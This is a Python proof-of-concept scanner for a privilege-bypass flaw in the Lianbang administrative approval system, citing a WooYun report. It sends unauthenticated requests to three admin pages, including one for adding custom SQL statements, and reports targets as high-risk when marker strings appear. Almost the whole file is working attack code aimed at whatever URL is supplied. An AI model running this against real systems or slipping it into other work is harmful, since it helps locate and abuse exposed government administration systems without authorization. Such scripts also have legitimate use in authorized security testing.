#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 连邦行政审批系统越权漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0126218
author: Lucifer
description: 1./workplate/xzsp/kqgl/kqsz/kqsz.aspx（无需登陆直接对系统内的考勤规则进行设置）
             2./workplate/xzsp/lbsxdict/add.aspx（添加联办事项字典）
             3./workplate/base/operation/add.aspx（自定义SQL语句添加）
'''
import sys
import requests
import warnings
from termcolor import cprint

class lianbang_multi_bypass_priv_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/workplate/xzsp/kqgl/kqsz/kqsz.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"tbPmSignOff" in req.text:
                cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")

            vulnurl = self.url + "/workplate/xzsp/lbsxdict/add.aspx"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"xksxid" in req.text:
                cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")

            vulnurl = self.url + "/workplate/base/operation/add.aspx"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"tbDescr" in req.text:
                cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = lianbang_multi_bypass_priv_BaseVerify(sys.argv[1])
    testVuln.run()